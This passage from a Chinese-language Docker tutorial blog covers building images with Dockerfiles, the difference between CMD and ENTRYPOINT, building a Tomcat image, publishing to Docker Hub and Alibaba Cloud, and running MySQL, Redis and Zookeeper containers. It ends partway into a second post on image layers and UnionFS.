class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">[root@nanzx myDockerFile]# ls</span><br><span class="line">Dockerfile</span><br><span class="line">[root@nanzx myDockerFile]# docker build -t mycentos:1.3 .</span><br><span class="line">Sending build context to Docker daemon  2.048kB</span><br><span class="line">Step 1/10 : FROM centos</span><br><span class="line"><span class="meta prompt_"> ---&gt; </span><span class="language-bash">300e315adb2f</span></span><br><span class="line">Step 2/10 : MAINTAINER nan&lt;839777408@qq.com&gt;</span><br><span class="line"><span class="meta prompt_"> ---&gt; </span><span class="language-bash">Running <span class="keyword">in</span> 7127813ad38d</span></span><br><span class="line">Removing intermediate container 7127813ad38d</span><br><span class="line"><span class="meta prompt_"> ---&gt; </span><span class="language-bash">9c0533e44a0a</span></span><br><span class="line">Step 3/10 : ENV MYPATH /usr/local</span><br><span class="line"><span class="meta prompt_"> ---&gt; </span><span class="language-bash">Running <span class="keyword">in</span> fb47fda174e9</span></span><br><span class="line">Removing intermediate container fb47fda174e9</span><br><span class="line"><span class="meta prompt_"> ---&gt; </span><span class="language-bash">82cf9fb823cc</span></span><br><span class="line">Step 4/10 : WORKDIR $MYPATH</span><br><span class="line"><span class="meta prompt_"> ---&gt; </span><span class="language-bash">Running <span class="keyword">in</span> 38de19574157</span></span><br><span class="line">Removing intermediate container 38de19574157</span><br><span class="line"><span class="meta prompt_"> ---&gt; </span><span class="language-bash">3467bda82bb7</span></span><br><span class="line">Step 5/10 : RUN yum -y install vim</span><br><span class="line"><span class="meta prompt_"> ---&gt; </span><span class="language-bash">Running <span class="keyword">in</span> 198852c5192c</span></span><br><span class="line">CentOS Linux 8 - AppStream                      6.6 MB/s | 8.8 MB     00:01    </span><br><span class="line">CentOS Linux 8 - BaseOS                         7.0 MB/s | 5.6 MB     00:00    </span><br><span class="line">CentOS Linux 8 - Extras                          15 kB/s |  10 kB     00:00    </span><br><span class="line">Dependencies resolved.</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">Installed:</span><br><span class="line">  gpm-libs-1.20.7-17.el8.x86_64         vim-common-2:8.0.1763-15.el8.x86_64    </span><br><span class="line">  vim-enhanced-2:8.0.1763-15.el8.x86_64 vim-filesystem-2:8.0.1763-15.el8.noarch</span><br><span class="line">  which-2.21-12.el8.x86_64             </span><br><span class="line"></span><br><span class="line">Complete!</span><br><span class="line">Removing intermediate container 198852c5192c</span><br><span class="line"><span class="meta prompt_"> ---&gt; </span><span class="language-bash">84b0976d75ce</span></span><br><span class="line">Step 6/10 : RUN yum -y install net-tools</span><br><span class="line"><span class="meta prompt_"> ---&gt; </span><span class="language-bash">Running <span class="keyword">in</span> d6de8e9cf44e</span></span><br><span class="line">Last metadata expiration check: 0:00:07 ago on Sun Sep  5 12:34:50 2021.</span><br><span class="line">Dependencies resolved.</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">Installed:</span><br><span class="line">  net-tools-2.0-0.52.20160912git.el8.x86_64                                     </span><br><span class="line">Complete!</span><br><span class="line">Removing intermediate container d6de8e9cf44e</span><br><span class="line"><span class="meta prompt_"> ---&gt; </span><span class="language-bash">45d11cc53ed5</span></span><br><span class="line">Step 7/10 : EXPOSE 80</span><br><span class="line"><span class="meta prompt_"> ---&gt; </span><span class="language-bash">Running <span class="keyword">in</span> bdc156599e08</span></span><br><span class="line">Removing intermediate container bdc156599e08</span><br><span class="line"><span class="meta prompt_"> ---&gt; </span><span class="language-bash">19fc20586285</span></span><br><span class="line">Step 8/10 : CMD echo $MYPATH</span><br><span class="line"><span class="meta prompt_"> ---&gt; </span><span class="language-bash">Running <span class="keyword">in</span> a268447d09ce</span></span><br><span class="line">Removing intermediate container a268447d09ce</span><br><span class="line"><span class="meta prompt_"> ---&gt; </span><span class="language-bash">05e469707492</span></span><br><span class="line">Step 9/10 : CMD echo &quot;success--------------ok&quot;</span><br><span class="line"><span class="meta prompt_"> ---&gt; </span><span class="language-bash">Running <span class="keyword">in</span> 697e6b2b7d70</span></span><br><span class="line">Removing intermediate container 697e6b2b7d70</span><br><span class="line"><span class="meta prompt_"> ---&gt; </span><span class="language-bash">2ab970b82316</span></span><br><span class="line">Step 10/10 : CMD /bin/bash</span><br><span class="line"><span class="meta prompt_"> ---&gt; </span><span class="language-bash">Running <span class="keyword">in</span> 46f76ba15387</span></span><br><span class="line">Removing intermediate container 46f76ba15387</span><br><span class="line"><span class="meta prompt_"> ---&gt; </span><span class="language-bash">9f3679e104c6</span></span><br><span class="line">Successfully built 9f3679e104c6</span><br><span class="line">Successfully tagged mycentos:1.3</span><br><span class="line">[root@nanzx myDockerFile]# </span><br></pre></td></tr></table></figure><p>3.运行新镜像：<code>docker run -it 新镜像名字:TAG</code></p><p>运行结果如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@nanzx myDockerFile]# docker images</span><br><span class="line">REPOSITORY   TAG       IMAGE ID       CREATED         SIZE</span><br><span class="line">mycentos     1.3       9f3679e104c6   8 minutes ago   307MB</span><br><span class="line">centos       latest    300e315adb2f   9 months ago    209MB</span><br><span class="line">[root@nanzx myDockerFile]# docker run -it mycentos:1.3</span><br><span class="line">[root@42be0264774b local]# pwd</span><br><span class="line">/usr/local</span><br><span class="line">[root@42be0264774b local]# ifconfig</span><br><span class="line">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br></pre></td></tr></table></figure><p>可以看到，我们自己的新镜像已经支持vim&#x2F;ifconfig命令，扩展成功了。</p><p>4.列出镜像的变更历史：<code>docker history 镜像名:TAG</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[root@nanzx myDockerFile]# docker history mycentos:1.3</span><br><span class="line">IMAGE          CREATED          CREATED BY                                      SIZE      COMMENT</span><br><span class="line">9f3679e104c6   10 minutes ago   /bin/sh -c #(nop)  CMD [&quot;/bin/sh&quot; &quot;-c&quot; &quot;/bin…   0B        </span><br><span class="line">2ab970b82316   10 minutes ago   /bin/sh -c #(nop)  CMD [&quot;/bin/sh&quot; &quot;-c&quot; &quot;echo…   0B        </span><br><span class="line">05e469707492   10 minutes ago   /bin/sh -c #(nop)  CMD [&quot;/bin/sh&quot; &quot;-c&quot; &quot;echo…   0B        </span><br><span class="line">19fc20586285   10 minutes ago   /bin/sh -c #(nop)  EXPOSE 80                    0B        </span><br><span class="line">45d11cc53ed5   10 minutes ago   /bin/sh -c yum -y install net-tools             29.5MB    </span><br><span class="line">84b0976d75ce   10 minutes ago   /bin/sh -c yum -y install vim                   68.1MB    </span><br><span class="line">3467bda82bb7   11 minutes ago   /bin/sh -c #(nop) WORKDIR /usr/local            0B        </span><br><span class="line">82cf9fb823cc   11 minutes ago   /bin/sh -c #(nop)  ENV MYPATH=/usr/local        0B        </span><br><span class="line">9c0533e44a0a   11 minutes ago   /bin/sh -c #(nop)  MAINTAINER nan&lt;839777408@…   0B        </span><br><span class="line">300e315adb2f   9 months ago     /bin/sh -c #(nop)  CMD [&quot;/bin/bash&quot;]            0B        </span><br><span class="line">&lt;missing&gt;      9 months ago     /bin/sh -c #(nop)  LABEL org.label-schema.sc…   0B        </span><br><span class="line">&lt;missing&gt;      9 months ago     /bin/sh -c #(nop) ADD file:bd7a2aed6ede423b7…   209MB   </span><br></pre></td></tr></table></figure><hr><h2 id="CMD-ENTRYPOINT镜像"><a href="#CMD-ENTRYPOINT镜像" class="headerlink" title="CMD&#x2F;ENTRYPOINT镜像"></a>CMD&#x2F;ENTRYPOINT镜像</h2><p>CMD&#x2F;ENTRYPOINT都是指定一个容器要启动时运行的命令。</p><p><strong>CMD:</strong></p><ul><li>Dockerfile中可以有多个CMD指令，但只有最后一个生效，CMD会被 docker run之后的参数替换</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">编写dockerfile文件</span> </span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">vim dockerfile-test-cmd</span> </span><br><span class="line"></span><br><span class="line">FROM centos </span><br><span class="line">CMD [&quot;ls&quot;,&quot;-a&quot;] </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">构建镜像</span> </span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker build -f dockerfile-test-cmd -t cmd-test:0.1 .</span> </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">运行镜像</span> </span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker run cmd-test:0.1</span> </span><br><span class="line">...</span><br><span class="line">bin </span><br><span class="line">dev </span><br><span class="line">root</span><br><span class="line">...</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">想追加一个命令 -l 成为<span class="built_in">ls</span> -al</span> </span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker run cmd-test:0.1 -l</span> </span><br><span class="line">docker: Error response from daemon: OCI runtime create failed: container_linux.go:349: starting container process caused &quot;exec: \&quot;-l\&quot;: executable file not found in $PATH&quot;: unknown. ERRO[0000] error waiting for container: context canceled </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">可执行文件找不到的报错，executable file not found。</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">跟在镜像名后面的是 <span class="built_in">command</span>，运行时会替换 CMD 的默认值</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">cmd的情况下 -l 替换了CMD[<span class="string">&quot;ls&quot;</span>,<span class="string">&quot;-l&quot;</span>]。 -l 不是命令所有报错</span></span><br></pre></td></tr></table></figure><hr><p><strong>ENTRYPOINT:</strong></p><ul><li>docker run之后的参数会被当做参数传递给ENTRYPOINT，之后形成新的命令组合</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">编写dockerfile文件</span> </span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">vim dockerfile-test-entrypoint</span> </span><br><span class="line"></span><br><span class="line">FROM centos </span><br><span class="line">ENTRYPOINT [&quot;ls&quot;,&quot;-a&quot;] </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker run entrypoint-test:0.1</span> </span><br><span class="line">...</span><br><span class="line">bin </span><br><span class="line">dev </span><br><span class="line">etc </span><br><span class="line">home  </span><br><span class="line">lost+found </span><br><span class="line">... </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-l命令是直接拼接在ENTRYPOINT命令后面的</span> </span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker run entrypoint-test:0.1 -l</span> </span><br><span class="line">total 56 </span><br><span class="line">drwxr-xr-x 1 root root 4096 May 16 06:32 . </span><br><span class="line">drwxr-xr-x 1 root root 4096 May 16 06:32 .. </span><br><span class="line">-rwxr-xr-x 1 root root 0 May 16 06:32 .dockerenv </span><br><span class="line">lrwxrwxrwx 1 root root 7 May 11 2019 bin -&gt; usr/bin </span><br><span class="line">...</span><br></pre></td></tr></table></figure><hr><h2 id="自定义镜像Tomcat"><a href="#自定义镜像Tomcat" class="headerlink" title="自定义镜像Tomcat"></a>自定义镜像Tomcat</h2><p>1.准备tomcat和jdk的linux安装包以及编写好的文本： apache-tomcat-9.0.35.tar.gz、jdk-8u231-linux-x64.tar.gz、README</p><p>2.编写dockerFile文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">FROM centos </span><br><span class="line">MAINTAINER nan&lt;839777408@qq.com&gt; </span><br><span class="line"></span><br><span class="line">COPY README /usr/local/README #把宿主机当前上下文的README拷贝到容器/usr/local/路径下</span><br><span class="line">ADD jdk-8u231-linux-x64.tar.gz /usr/local/ #复制解压 </span><br><span class="line">ADD apache-tomcat-9.0.35.tar.gz /usr/local/ #复制解压 </span><br><span class="line"></span><br><span class="line">RUN yum -y install vim #安装vim编辑器</span><br><span class="line"></span><br><span class="line">ENV MYPATH /usr/local #设置环境变量 </span><br><span class="line">WORKDIR $MYPATH #设置工作访问时候的WORKDIR路径，登录落脚点</span><br><span class="line"></span><br><span class="line">ENV JAVA_HOME /usr/local/jdk1.8.0_231 #设置环境变量 </span><br><span class="line">ENV CLASSPATH $JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar #设置环境变量 </span><br><span class="line">ENV CATALINA_HOME /usr/local/apache-tomcat-9.0.35 #设置环境变量 </span><br><span class="line">ENV PATH $PATH:$JAVA_HOME/bin:$CATALINA_HOME/lib:$CATALINA_HOME/bin #设置环境变量 分隔符是： </span><br><span class="line"></span><br><span class="line">EXPOSE 8080 #设置暴露的端口 </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ENTRYPOINT [<span class="string">&quot;/usr/local/apache-tomcat-9.0.35/bin/startup.sh&quot;</span> ]</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">CMD [<span class="string">&quot;/usr/local/apache-tomcat-9.0.35/bin/catalina.sh&quot;</span>,<span class="string">&quot;run&quot;</span>]</span></span><br><span class="line">CMD /usr/local/apache-tomcat-9.0.35/bin/startup.sh &amp;&amp; tail -F /usr/local/apache- tomcat-9.0.35/logs/catalina.out #启动时运行tomcat</span><br></pre></td></tr></table></figure><p>3.构建镜像：<code>docker build -t mytomcat:0.1 . </code></p><p>4.运行镜像：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">docker run </span><br><span class="line">-d </span><br><span class="line">-p 8080:8080 </span><br><span class="line">--name tomcat01 </span><br><span class="line">-v /home/nan/build/tomcat/test:/usr/local/apache-tomcat-9.0.35/webapps/test </span><br><span class="line">-v /home/nan/build/tomcat/tomcatlogs/:/usr/local/apache-tomcat-9.0.35/logs </span><br><span class="line">mytomcat:0.1</span><br></pre></td></tr></table></figure><blockquote><p>Docker挂载主机目录Docker访问出现cannot open directory : Permission denied</p><p>解决办法：在挂载目录后多加一个–privileged&#x3D;true参数即可</p></blockquote><hr><h1 id="镜像发布"><a href="#镜像发布" class="headerlink" title="镜像发布"></a>镜像发布</h1><p><strong>镜像的生成方法：</strong></p><ol><li>DockerFile</li><li>从容器创建一个新的镜像：<code>docker commit [OPTIONS] 容器ID [REPOSITORY[：TAG]]</code></li><li>OPTIONS说明：-a :提交的镜像作者；-m :提交时的说明文字；</li></ol><hr><p><strong>Docker Hub发布：</strong></p><ol><li><p>官网：<a href="https://hub.docker.com/">https://hub.docker.com/</a></p></li><li><p>登录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker login --<span class="built_in">help</span></span> </span><br><span class="line">Usage: docker login [OPTIONS] [SERVER] </span><br><span class="line"></span><br><span class="line">Log in to a Docker registry. </span><br><span class="line">If no server is specified, the default is defined by the daemon. </span><br><span class="line"></span><br><span class="line">Options: </span><br><span class="line">-p, --password string Password </span><br><span class="line">--password-stdin Take the password from stdin </span><br><span class="line">    -u, --username string Username</span><br><span class="line">   </span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">docker login -u nan <span class="comment">#nan改成用户名</span></span></span><br></pre></td></tr></table></figure></li><li><p>提交 push镜像：<code>docker push mytomcat</code></p></li></ol><blockquote><p>会发现push不上去，因为如果没有前缀的话默认是push到 官方的library </p><p>解决方法 </p><ol><li><p>build的时候添加你的dockerhub用户名，然后在push就可以放到自己的仓库了 </p><p>$ docker build -t nan&#x2F;mytomcat:0.1 . </p></li><li><p>使用docker tag #然后再次push </p><p>$ docker tag 容器id nan&#x2F;mytomcat:1.0 #然后再次push</p></li></ol></blockquote><hr><p><strong>阿里云发布：</strong></p><ol><li>官网详细教程：<a href="https://cr.console.aliyun.com/repository/">https://cr.console.aliyun.com/repository/</a> </li><li>阿里云开发者平台：<a href="https://dev.aliyun.com/search.html">https://dev.aliyun.com/search.html</a></li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> docker login --username= registry.cn-shenzhen.aliyuncs.com</span> </span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> docker tag [ImageId] registry.cn-shenzhen.aliyuncs.com/nanzx/mytomcat:[镜像版本号]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> docker push registry.cn-shenzhen.aliyuncs.com/nanzx/mytomcat:[镜像版本号]</span></span><br></pre></td></tr></table></figure><ol start="3"><li>接下来就可以在阿里云开发者平台的公有云查询到</li><li>将镜像下载下来</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> docker pull registry.cn-shenzhen.aliyuncs.com/nanzx/mytomcat:[镜像版本号]</span></span><br></pre></td></tr></table></figure><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706215002.png"></p><hr><h1 id="Docker常用安装"><a href="#Docker常用安装" class="headerlink" title="Docker常用安装"></a>Docker常用安装</h1><h2 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">docker run -p 12345:3306 --name mysql </span><br><span class="line">-v /root/mysql/conf:/etc/mysql/conf.d </span><br><span class="line">-v /root/mysql/logs:/logs </span><br><span class="line">-v /root/mysql/data:/var/lib/mysql </span><br><span class="line">-e MYSQL_ROOT_PASSWORD=123456 </span><br><span class="line">-d mysql:5.6 </span><br></pre></td></tr></table></figure><p>命令说明：</p><p>-p 12345:3306：将主机的12345端口映射到docker容器的3306端口。</p><p>–name mysql：运行容器的名字</p><p>-v &#x2F;root&#x2F;mysql&#x2F;conf:&#x2F;etc&#x2F;mysql&#x2F;conf.d ：将主机&#x2F;root&#x2F;mysql录下的conf&#x2F;my.cnf 挂载到容器的 &#x2F;etc&#x2F;mysql&#x2F;conf.d</p><p>-v &#x2F;root&#x2F;mysql&#x2F;logs:&#x2F;logs：将主机&#x2F;root&#x2F;mysql目录下的 logs 目录挂载到容器的 &#x2F;logs</p><p>-v &#x2F;root&#x2F;mysql&#x2F;data:&#x2F;var&#x2F;lib&#x2F;mysql ：将主机&#x2F;root&#x2F;mysql目录下的data目录挂载到容器的 &#x2F;var&#x2F;lib&#x2F;mysql </p><p>-e MYSQL_ROOT_PASSWORD&#x3D;123456：初始化 root 用户的密码。</p><p>-d mysql:5.6 : 后台程序运行mysql5.6</p><hr><h2 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker run -p 6379:6379 </span><br><span class="line">-v /root/redis/data:/data </span><br><span class="line">-v /root/redis/conf/redis.conf:/usr/local/etc/redis/redis.conf  </span><br><span class="line">-d redis:3.2 redis-server /usr/local/etc/redis/redis.conf --appendonly yes</span><br></pre></td></tr></table></figure><p>命令说明：</p><p>redis-server &#x2F;usr&#x2F;local&#x2F;etc&#x2F;redis&#x2F;redis.conf –appendonly yes ：表示启动持久化存储</p><p>主机&#x2F;root&#x2F;redis&#x2F;conf&#x2F;redis.conf需要自行配置</p><p>连接：<code> docker exec -it 运行着Rediis服务的容器ID redis-cli</code></p><hr><h2 id="CentOS"><a href="#CentOS" class="headerlink" title="CentOS"></a>CentOS</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it -d -p 8081:8081 --name centos01 centos</span><br></pre></td></tr></table></figure><p>命令说明：</p><p>需要加 -it 保持伪终端的运行，防止容器因没有进程Kill itself</p><hr><h2 id="Zookeeper"><a href="#Zookeeper" class="headerlink" title="Zookeeper"></a>Zookeeper</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker run -d</span><br><span class="line">-p 2181:2181</span><br><span class="line">-v /root/zookeeper/data/:/data/</span><br><span class="line">--name=zookeeper</span><br><span class="line">--privileged zookeeper</span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20210905223219.png"></p><hr>]]></content>
      
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
            <tag> DockerFile </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker镜像和容器数据卷</title>
      <link href="/posts/f978/"/>
      <url>/posts/f978/</url>
      
        <content type="html"><![CDATA[<h1 id="Docker镜像"><a href="#Docker镜像" class="headerlink" title="Docker镜像"></a>Docker镜像</h1><p>镜像是一种轻量级、可执行的独立软件包，<strong>是用来打包软件运行环境和基于运行环境开发的软件</strong>，它包含运行某个软件所需的所有内容，包括代码、运行时、库、环境变量和配置文件。</p><h2 id="镜像加载原理"><a href="#镜像加载原理" class="headerlink" title="镜像加载原理"></a>镜像加载原理</h2><p><strong>UnionFs （联合文件系统）：</strong></p><p>Union文件系统（UnionFS）是一种分层、轻量级并且高性能的文件系统，它支持<strong>对文件系统的修改作为一次提交来一层层的叠加</strong>，同时可以将不同目录挂载到同一个虚拟文件系统下(unite several directories into a single virtual filesystem)。<strong>Union 文件系统是 Docker 镜像的基础</strong>。镜像可以通过分层来进行继承，基于基础镜像（没有父镜像），可以制作各种具体的应用镜像。</p><p><strong>特性：</strong>一次同时加载多个文件系统，但从外面看起来，只能看到一个文件系统，联合加载会把各层文件系统叠加起来，这样最终的文件系统会包含所有底层的文件和目录。</p><blockquote><p>我们pull镜像的时候看到一层层的下载就是这个。</p></blockquote><hr><p> docker的镜像实际上由一层一层的文件系统组成，这种层级的文件系统UnionFS。</p><p>bootfs(boot file system)主要包含bootloader和kernel， bootloader主要是引导加载kernel。 Linux刚启动时会加载bootfs文件系统，而在Docker镜像的最底层也是bootfs。这一层与我们典型的Linux&#x2F;Unix系统是一样的，包含boot加载器和内核。当boot加载完成之后整个内核就都在内存中了，此时内存的使用权已由bootfs转交给内核，此时系统也会卸载bootfs。</p><p>rootfs (root file system) ，在bootfs之上。包含的就是典型 Linux 系统中的 &#x2F;dev, &#x2F;proc, &#x2F;bin, &#x2F;etc 等标准目录和文件。rootfs就是各种不同的操作系统发行版，比如Ubuntu，Centos等等。 </p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706215036.png"></p><blockquote><ul><li><strong>平时我们安装进虚拟机的CentOS都是好几个G，为什么docker里才200M？</strong></li></ul><p>对于一个精简的OS，rootfs可以很小，只需要包括最基本的命令、工具和程序库就可以了，因为底层直接用Host的kernel，自己只需要提供 rootfs 就行了。由此可见对于不同的linux发行版， bootfs基本是一致的，rootfs会有差别，因此不同的发行版可以公用bootfs。</p></blockquote><hr><p><strong>为什么Docker镜像要采用这种分层的结构呢？</strong></p><p>最大的一个好处就是 【共享资源】</p><p>比如：有多个镜像都从相同的 base 镜像构建而来，那么宿主机只需在磁盘上保存一份base镜像，同时内存中也只需加载一份 base 镜像，就可以为所有容器服务了。而且镜像的每一层都可以被共享。</p><hr><h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><blockquote><p>Docker镜像都是<strong>只读</strong>的。当容器启动时，一个新的可写层被加载到镜像的顶部。这一层通常被称作“容器层”，“容器层”之下的都叫“镜像层”。</p></blockquote><p>所有的 Docker镜像都起始于一个基础镜像层，当进行修改或添加新的内容时，就会在当前镜像层之上，创建新的镜像层。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20210626120405.png"></p><hr><p>举一个简单的例子，假如基于 Ubuntu Linux16.04创建一个新的镜像，这就是新镜像的第一层；如果在该镜像中添加 Python包，就会在基础镜像层之上创建第二个镜像层；如果继续添加一个安全补丁，就会创健第三个镜像层。该镜像当前已经包含3个镜像层，如下图所示（这只是一个用于演示的很简单的例子）。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20210614183917.png"></p><p>在添加额外的镜像层的同时，镜像始终保持是当前所有镜像的组合，理解这一点非常重要。下图中举了一个简单的例子，每个镜像层包含3个文件，而镜像包含了来自两个镜像层的6个文件。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20210614231012.png"></p><p>下图中展示了一个稍微复杂的三层镜像，在外部看来整个镜像只有6个文件，这是因为最上层中的文件7是文件5的一个更新版。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" 